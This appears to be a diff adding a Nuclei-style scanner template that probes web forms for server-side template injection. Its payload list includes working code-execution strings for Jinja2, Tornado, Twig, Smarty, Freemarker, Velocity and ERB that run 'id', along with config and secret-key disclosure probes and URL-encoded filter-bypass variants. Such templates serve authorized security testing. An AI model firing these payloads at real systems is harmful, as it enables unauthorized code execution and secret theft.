@@ -1,0 +1,223 @@
+id: post-ssti
+
+info:
+  name: POST-based SSTI Detection (Server-Side Template Injection)
+  author: custom
+  severity: critical
+  description: Detects Server-Side Template Injection (SSTI) vulnerability via POST request with various template payloads for Jinja2, Flask, Django, and other template engines
+  tags: ssti,post,rce,template-injection,custom
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+
+variables:
+  random: "{{1337}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "{{param}}={{payload}}&pw=test&password=test"
+
+    payloads:
+      param:
+        - "id"
+        - "username"
+        - "name"
+        - "email"
+        - "message"
+        - "content"
+        - "search"
+        - "query"
+
+      payload:
+        # Short payloads (3-10 chars) for restricted environments
+        # These work within length constraints like the example code
+        - "{{g}}"
+        - "{{dict}}"
+        - "{{self}}"
+        - "{{url}}"
+        - "{{config}}"
+
+        # Basic Jinja2/Flask SSTI detection
+        - "{{7*7}}"
+        - "{{7*'7'}}"
+        - "{{config.items()}}"
+        - "{{''.__class__}}"
+        - "{{request}}"
+        - "{{session}}"
+
+        # URL encoded versions for WAF bypass
+        - "%7B%7B7*7%7D%7D"
+        - "%7B%7Bconfig%7D%7D"
+        - "%7B%7Bself%7D%7D"
+
+        # Jinja2 RCE payloads
+        - "{{''.__class__.__mro__[1]}}"
+        - "{{config.__class__.__init__.__globals__}}"
+        - "{{request.application.__globals__}}"
+        - "{{''.__class__.__mro__[2].__subclasses__()}}"
+
+        # Flask specific
+        - "{{url_for.__globals__}}"
+        - "{{get_flashed_messages.__globals__}}"
+        - "{{request.application}}"
+        - "{{g.pop.__globals__}}"
+
+        # Advanced Jinja2 SSTI
+        - "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\")}}{%endif%}{%endfor%}"
+        - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+
+        # Django template injection
+        - "{{settings.SECRET_KEY}}"
+        - "{%debug%}"
+        - "{{7*'7'}}"
+
+        # Context breaking + SSTI
+        - "'}{{7*7}}{'"
+        - "\"}{{config}}{\""
+        - "'}{{self}}{{'"
+
+        # Polyglot SSTI
+        - "${{7*7}}"
+        - "${7*7}"
+        - "{{7*7}}"
+        - "#{7*7}"
+        - "*{7*7}"
+
+        # Tornado template injection
+        - "{{eval(\"5+5\")}}"
+        - "{%import os%}{{os.popen('id').read()}}"
+
+        # Twig (PHP) SSTI
+        - "{{7*'7'}}"
+        - "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
+
+        # Smarty (PHP) SSTI
+        - "{system('id')}"
+        - "{php}echo `id`;{/php}"
+
+        # Freemarker SSTI
+        - "${7*7}"
+        - "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
+
+        # Velocity SSTI
+        - "#set($x=7*7)$x"
+        - "#set($str=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))"
+
+        # ERB (Ruby) SSTI
+        - "<%=7*7%>"
+        - "<%=`id`%>"
+
+    attack: clusterbomb
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: ssti-math-evaluation
+        dsl:
+          - 'contains(body, "49")'
+          - 'contains(body, "7777777")'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: ssti-flask-config
+        dsl:
+          - 'contains(body, "SECRET_KEY")'
+          - 'contains(body, "DEBUG")'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: ssti-class-exposure
+        dsl:
+          - 'contains(body, "<class")'
+          - 'contains(body, "object")'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: ssti-dict-class
+        dsl:
+          - 'contains(body, "<class")'
+          - 'contains(body, "dict")'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: ssti-flask-objects
+        dsl:
+          - 'contains(body, "<flask")'
+          - 'status_code == 200'
+        condition: or
+
+      - type: dsl
+        name: ssti-request-object
+        dsl:
+          - 'contains(body, "Request")'
+          - 'contains(body, "environ")'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: ssti-globals-exposure
+        dsl:
+          - 'contains(body, "__globals__")'
+          - 'contains(body, "__builtins__")'
+          - 'status_code == 200'
+        condition: or
+
+      - type: dsl
+        name: ssti-subclasses
+        dsl:
+          - 'contains(body, "subclasses")'
+          - 'contains(body, "__class__")'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: ssti-command-execution
+        dsl:
+          - 'regex("uid=[0-9]+.*gid=[0-9]+", body)'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: ssti-django-debug
+        dsl:
+          - 'contains(body, "VariableDoesNotExist")'
+          - 'contains(body, "Context")'
+          - 'status_code == 200'
+        condition: or
+
+      - type: dsl
+        name: ssti-error-disclosure
+        dsl:
+          - 'contains(body, "jinja2")'
+          - 'contains(body, "TemplateSyntaxError")'
+          - 'contains(body, "UndefinedError")'
+          - 'status_code == 500'
+        condition: or
+
+      - type: word
+        name: ssti-config-items
+        part: body
+        words:
+          - "dict_items"
+          - "PERMANENT_SESSION_LIFETIME"
+          - "APPLICATION_ROOT"
+
+    extractors:
+      - type: regex
+        name: ssti-result
+        part: body
+        regex:
+          - "49"
+          - "7777777"
+          - "<class '[^']*'>"
+          - "uid=[0-9]+\\(.*\\) gid=[0-9]+\\(.*\\)"
